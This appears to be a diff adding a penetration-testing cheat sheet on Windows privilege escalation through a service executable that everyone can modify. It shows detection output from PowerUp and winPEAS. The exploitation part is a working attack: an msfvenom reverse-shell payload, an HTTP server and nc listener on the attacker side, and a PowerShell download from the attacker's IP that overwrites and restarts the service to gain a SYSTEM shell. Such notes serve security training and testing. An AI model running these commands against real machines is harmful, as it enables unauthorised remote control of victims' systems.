@@ -1,0 +1,32 @@
+# Executable Files
+# Detection
+powershell -exec bypass -command "& { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }"
+
+# [*] Checking service executable and argument permissions...
+#
+# ServiceName                     : filepermsvc
+# Path                            : "C:\Program Files\File Permissions Service\filepermservice.exe"
+# ModifiableFile                  : C:\Program Files\File Permissions Service\filepermservice.exe
+# ModifiableFilePermissions       : {ReadAttributes, ReadControl, Execute/Traverse, DeleteChild...}
+# ModifiableFileIdentityReference : Everyone
+# StartName                       : LocalSystem
+# AbuseFunction                   : Install-ServiceBinary -Name 'filepermsvc'
+# CanRestart                      : True
+
+# or
+winPEAS.exe
+
+# [+] Interesting Services -non Microsoft-(T1007)
+# filepermsvc(Apache Software Foundation - File Permissions Service)["C:\Program Files\File Permissions Service\filepermservice.exe"] - Manual - Stopped
+#	File Permissions: Everyone [AllAccess]
+
+# Exploitation
+# Attacker
+msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > program.exe
+sudo python -m SimpleHTTPServer 80
+sudo nc -lvp <PORT>
+
+# Victim
+powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>/program.exe', 'C:\Temp\program.exe')
+copy /y c:\Temp\program.exe "C:\Program Files\File Permissions Service\filepermservice.exe"
+sc start filepermsvc
